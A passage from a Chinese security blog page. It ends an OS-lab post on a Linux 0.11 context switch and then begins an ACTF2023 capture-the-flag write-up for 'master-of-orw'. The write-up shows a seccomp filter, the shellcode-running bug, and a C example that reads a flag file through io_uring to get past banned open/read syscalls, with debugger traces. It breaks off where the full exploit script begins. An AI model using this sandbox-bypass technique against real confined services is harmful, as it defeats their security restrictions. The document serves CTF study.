<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">.align 2</span><br><span class="line">switch_to:</span><br><span class="line">	pushl %ebp /* 构建栈帧,保存eax,ebx,ecx寄存器(存入当前进程的内核栈) */</span><br><span class="line">	movl %esp,%ebp</span><br><span class="line">	pushl %ecx</span><br><span class="line">	pushl %ebx</span><br><span class="line">	pushl %eax</span><br><span class="line"></span><br><span class="line">	movl 8(%ebp),%ebx</span><br><span class="line">	cmpl %ebx,current /* 对比task[n](切换进程)是否为当前进程 */</span><br><span class="line">	je 1f</span><br><span class="line">	</span><br><span class="line">	movl %ebx,%eax</span><br><span class="line">	xchgl %eax,current /* 交换current和task[n]的指针 */</span><br><span class="line">	</span><br><span class="line">	movl tss,%ecx /* tss永远指向内核进程的tss_struct(即tss0) */</span><br><span class="line">	addl $4096,%ebx	/* 此时ebx指向切换进程的栈顶 */</span><br><span class="line">	movl %ebx,4(%ecx) /* 将task[n]的栈顶存入tss0-&gt;esp0(tss0+4) */</span><br><span class="line"></span><br><span class="line">	movl %esp,KERNEL_STACK(%eax) /* 将esp存入当前进程的task_struct-&gt;kernelstack */</span><br><span class="line">	movl 8(%ebp),%ebx</span><br><span class="line">	movl KERNEL_STACK(%ebx),%esp /* 设置esp为task[n]的task_struct-&gt;kernelstack */</span><br><span class="line"></span><br><span class="line">	/* 从此刻开始已经进入task[n]的内核栈 */</span><br><span class="line">	movl 12(%ebp),%ecx</span><br><span class="line">	lldt %cx /* 修改LDTR寄存器 */</span><br><span class="line">	</span><br><span class="line">	movl $0x17,%ecx /* 通过fs寄存器,操作系统才能访问进程的用户态内存 */ </span><br><span class="line">	mov %cx,%fs /* 这里LDT切换完成意味着切换到了新的用户态地址空间,所以需要重置fs */</span><br><span class="line">	cmpl %eax,last_task_used_math</span><br><span class="line">	jne 1f</span><br><span class="line">	clts</span><br><span class="line"></span><br><span class="line">1:	popl %eax /* 弹出切换进程的内核栈数据 */</span><br><span class="line">	popl %ebx</span><br><span class="line">	popl %ecx</span><br><span class="line">	popl %ebp</span><br><span class="line">	ret	/* 执行first_return_kernel函数 */</span><br></pre></td></tr></table></figure>
<ul>
<li>新 <code>switch_to</code> 编写完成以后，需要将原来的 <code>switch_to</code> 注释掉</li>
</ul>
<p>这里有一点需要注意：</p>
<ul>
<li>即使我们不使用 TSS 机制切换进程但也要设置 TSS0</li>
<li>中断处理时需要寻找当前进程的内核栈，否则就不能从用户栈切到内核栈，内核栈的寻找是借助当前进程 TSS 中存放的信息来完成的（当前进程的 TSS 还是通过 TR 寄存器在 GDT 全局描述符表中找到的）</li>
<li>虽然此时不使用 TSS 进行进程切换，但是 Intel 的中断处理机制还是要保持，所以每个进程仍然需要一个 TSS，操作系统需要有一个当前 TSS，这里采用的方案是让所有进程共用一个 TSS0</li>
</ul>
<p>函数 <code>first_return_kernel</code> 负责完成剩下寄存器的切换，以及程序的跳转：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.align 2</span><br><span class="line">first_return_kernel:</span><br><span class="line">	popl %edx</span><br><span class="line">	popl %edi</span><br><span class="line">	popl %esi</span><br><span class="line">	pop %gs</span><br><span class="line">	pop %fs</span><br><span class="line">	pop %es</span><br><span class="line">	pop %ds</span><br><span class="line">	iret /* 从中断中返回,并设置cs:eip,eflags,ss:esp */</span><br></pre></td></tr></table></figure>
<ul>
<li>指令 <code>iret</code> 执行以后，进程将恢复到用户态进程</li>
</ul>
<p>最后修改一下 <code>schedule</code> 中关于 <code>switch_to</code> 的调用即可：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">       ......</span><br><span class="line">	<span class="keyword">while</span> (--i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!*--p)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">			c = (*p)-&gt;counter, next = i ,pnext = *p;</span><br><span class="line">	&#125;</span><br><span class="line">       ......</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// switch_to(next);</span></span><br><span class="line">switch_to(pnext,_LDT(next));</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/01/ACTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/01/ACTF2023/" class="post-title-link" itemprop="url">ACTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-01 22:09:35 / Modified: 22:13:28" itemprop="dateCreated datePublished" datetime="2023-11-01T22:09:35+08:00">2023-11-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>23k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>20 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="master-of-orw"><a href="#master-of-orw" class="headerlink" title="master-of-orw"></a>master-of-orw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">master-of-orw: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">9</span>ca858a89af65e342074ea6e69e1f20ddba93d11, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，NX，PIE</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x19</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x16</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x14</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x13</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x12</span> <span class="number">0x00</span> <span class="number">0x00000011</span>  <span class="keyword">if</span> (A == pread64) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x11</span> <span class="number">0x00</span> <span class="number">0x00000012</span>  <span class="keyword">if</span> (A == pwrite64) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x10</span> <span class="number">0x00</span> <span class="number">0x00000013</span>  <span class="keyword">if</span> (A == readv) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x0f</span> <span class="number">0x00</span> <span class="number">0x00000014</span>  <span class="keyword">if</span> (A == writev) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x0e</span> <span class="number">0x00</span> <span class="number">0x00000028</span>  <span class="keyword">if</span> (A == sendfile) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x0d</span> <span class="number">0x00</span> <span class="number">0x0000002c</span>  <span class="keyword">if</span> (A == sendto) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x0c</span> <span class="number">0x00</span> <span class="number">0x0000002e</span>  <span class="keyword">if</span> (A == sendmsg) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0015</span>: <span class="number">0x15</span> <span class="number">0x0b</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0016</span>: <span class="number">0x15</span> <span class="number">0x0a</span> <span class="number">0x00</span> <span class="number">0x00000101</span>  <span class="keyword">if</span> (A == openat) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0017</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000127</span>  <span class="keyword">if</span> (A == preadv) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x00000128</span>  <span class="keyword">if</span> (A == pwritev) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0019</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x0000012f</span>  <span class="keyword">if</span> (A == name_to_handle_at) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0020</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000130</span>  <span class="keyword">if</span> (A == open_by_handle_at) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0021</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000142</span>  <span class="keyword">if</span> (A == execveat) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0022</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000147</span>  <span class="keyword">if</span> (A == preadv2) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0023</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000148</span>  <span class="keyword">if</span> (A == pwritev2) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0024</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x000001ac</span>  <span class="keyword">if</span> (A == <span class="number">0x1ac</span>) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0025</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000001b5</span>  <span class="keyword">if</span> (A == <span class="number">0x1b5</span>) <span class="keyword">goto</span> <span class="number">0027</span></span><br><span class="line"><span class="number">0026</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0027</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>执行 shellcode，但是有沙盒：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">code = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Input your code&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, code, <span class="number">0x400</span>uLL);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Wish you a good journey&quot;</span>);</span><br><span class="line">box();</span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))code)();</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 openat 和 open 都被 ban 了的情况下，只能使用 io_uring 来进行 ORW</p>
<p>io_uring（Unified Resource Gestion）是一种 Linux 内核中的新特性，它提供了一种高性能、低延迟的 I/O 调度机制</p>
<p>基于共享内存，io_uring 维护了两个与内核共享的队列：</p>
<ul>
<li>submit 队列：用于存储待提交的 I/O 请求 </li>
<li>completion 队列：用于存储 I/O 请求的完成状态</li>
</ul>
<p>submit 队列中的 I/O 请求与 completion 队列中的 I/O 完成事件之间也没有固定的对应关系，内核会根据 I/O 请求的类型、文件描述符、线程池等信息自动将 I/O 请求分配到合适的队列中 </p>
<ul>
<li>由于 submit / completion 队列属于用户态程序与内核的共享空间</li>
<li>内核只需要读取 submit 队列中的参数就可以执行相应的内核态函数，不需要执行系统调用</li>
<li>当数据执行完毕时，内核又会将返回数据写入 completion 队列</li>
</ul>
<p>先给出一个 io_uring ORW 的案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o io_uring io_uring.c -static -luring -fno-stack-protector -no-pie -g</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;liburing.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUEUE_DEPTH 1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;    </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring</span> <span class="title">ring</span>;</span>    </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span>    </span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span> *<span class="title">cqe</span>;</span>    </span><br><span class="line">   <span class="keyword">int</span> fd, ret;    </span><br><span class="line">   <span class="keyword">char</span> buffer[<span class="number">4096</span>]; </span><br><span class="line">   io_uring_queue_init(QUEUE_DEPTH, &amp;ring, <span class="number">0</span>);</span><br><span class="line">   sqe = io_uring_get_sqe(&amp;ring);    </span><br><span class="line">   io_uring_prep_openat(sqe, AT_FDCWD, <span class="string">&quot;./flag&quot;</span>, O_RDONLY, <span class="number">0</span>);    </span><br><span class="line">   io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line">   ret = io_uring_submit(&amp;ring);    </span><br><span class="line">   ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);   </span><br><span class="line">   fd = cqe-&gt;res;  </span><br><span class="line">   sqe = io_uring_get_sqe(&amp;ring);    </span><br><span class="line">   io_uring_prep_read(sqe, fd, buffer, <span class="keyword">sizeof</span>(buffer), <span class="number">0</span>);    </span><br><span class="line">   io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line">   ret = io_uring_submit(&amp;ring);    </span><br><span class="line">   ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);    </span><br><span class="line">   sqe = io_uring_get_sqe(&amp;ring);    </span><br><span class="line">   io_uring_prep_write(sqe, <span class="number">1</span>, buffer, <span class="built_in">strlen</span>(buffer), <span class="number">0</span>);    </span><br><span class="line">   io_uring_sqe_set_data(sqe, <span class="literal">NULL</span>);</span><br><span class="line">   ret = io_uring_submit(&amp;ring);    </span><br><span class="line">   ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);    </span><br><span class="line">   io_uring_cqe_seen(&amp;ring, cqe);    </span><br><span class="line">   io_uring_queue_exit(&amp;ring);    </span><br><span class="line">   close(fd);    </span><br><span class="line">   sleep(<span class="number">1</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以进行单步调试，观察并记录上述代码的执行流程</p>
<p>io_uring_queue_init：核心初始化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io_uring_queue_init(<span class="number">1u</span>, &amp;ring, <span class="number">0</span>); <span class="comment">/* 一次sys_unk_425,两次sys_mmap */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>sys_unk_425：初始化 io_uring 的系统调用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x402aca</span> &lt;__io_uring_queue_init_params+<span class="number">90</span>&gt;     syscall  &lt;SYS_&lt;unk_425&gt;&gt;</span><br><span class="line">       rdi: <span class="number">0x1</span></span><br><span class="line">       rsi: <span class="number">0x7fffffffc9f0</span> ◂— <span class="number">0x0</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       r10: <span class="number">0x2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>sys_mmap：创建 submit 队列 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x401235</span> &lt;io_uring_queue_mmap+<span class="number">149</span>&gt;    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x0</span></span><br><span class="line">       len: <span class="number">0x184</span></span><br><span class="line">       prot: <span class="number">0x3</span></span><br><span class="line">       flags: <span class="number">0x8001</span></span><br><span class="line">       fd: <span class="number">0x3</span> (anon_inode:[io_uring])</span><br><span class="line">       offset: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>sys_mmap：创建 completion 队列</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x4012c9</span> &lt;io_uring_queue_mmap+<span class="number">297</span>&gt;    syscall  &lt;SYS_mmap&gt;</span><br><span class="line">       addr: <span class="number">0x0</span></span><br><span class="line">       len: <span class="number">0x40</span></span><br><span class="line">       prot: <span class="number">0x3</span></span><br><span class="line">       flags: <span class="number">0x8001</span></span><br><span class="line">       fd: <span class="number">0x3</span> (anon_inode:[io_uring])</span><br><span class="line">       offset: <span class="number">0x10000000</span></span><br></pre></td></tr></table></figure>
<p>io_uring_get_sqe：获取 <code>io_uring_sqe</code> 结构体的指针（该结构体用于描述一个 submit 条目）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqe = io_uring_get_sqe(&amp;ring);</span><br></pre></td></tr></table></figure>
<p>io_uring_prep_openat / io_uring_prep_read / io_uring_prep_write：注册 open / read / write</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io_uring_prep_openat(sqe, <span class="number">-100</span>, <span class="string">&quot;./flag&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">io_uring_prep_read(sqe, fd, buffer, <span class="number">0x1000</span>u, <span class="number">0LL</span>);</span><br><span class="line">io_uring_prep_write(sqe, <span class="number">1</span>, buffer, len, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>将信息填写入 submit / completion 队列，核心函数为 io_uring_prep_rw</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x402473</span> &lt;io_uring_prep_rw+<span class="number">35</span>&gt;    mov    byte ptr [rax], dl</span><br><span class="line">  <span class="number">0x402475</span> &lt;io_uring_prep_rw+<span class="number">37</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x402479</span> &lt;io_uring_prep_rw+<span class="number">41</span>&gt;    mov    byte ptr [rax + <span class="number">1</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x40247d</span> &lt;io_uring_prep_rw+<span class="number">45</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]</span><br><span class="line">  <span class="number">0x402481</span> &lt;io_uring_prep_rw+<span class="number">49</span>&gt;    mov    word ptr [rax + <span class="number">2</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x402487</span> &lt;io_uring_prep_rw+<span class="number">55</span>&gt;    mov    rax, qword ptr [rbp - <span class="number">0x10</span>]</span><br></pre></td></tr></table></figure>
<p>io_uring_submit：向内核提交注册信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_submit(&amp;ring);</span><br></pre></td></tr></table></figure>
<ul>
<li>sys_unk_426：提交注册信息的系统调用</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x40466b</span> &lt;io_uring_submit+<span class="number">123</span>&gt;    syscall  &lt;SYS_&lt;unk_426&gt;&gt;</span><br><span class="line">       rdi: <span class="number">0x3</span></span><br><span class="line">       rsi: <span class="number">0x1</span></span><br><span class="line">       rdx: <span class="number">0x0</span></span><br><span class="line">       r10: <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>io_uring_wait_cqe：获取 <code>io_uring_cqe</code> 结构体的指针（该结构体用于描述一个 completion 条目）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret = io_uring_wait_cqe(&amp;ring, &amp;cqe);</span><br></pre></td></tr></table></figure>
<p>接下来就可以 IDA 分析二进制文件，提取出有效的汇编指令片段：</p>
<ul>
<li>shellcode 各个函数的汇编代码尽量和二进制文件一致</li>
<li>对于 io_uring_queue_init / io_uring_submit 函数需要保证系统调用的参数一致</li>
<li>对于 io_uring_prep_rw 则需要保证填写的数据一致</li>
<li>对于 io_uring_get_sqe / io_uring_wait_cqe 只需要提取基本的汇编代码即可</li>
<li>函数 io_uring_prep_read 可以被 mmap 替代</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 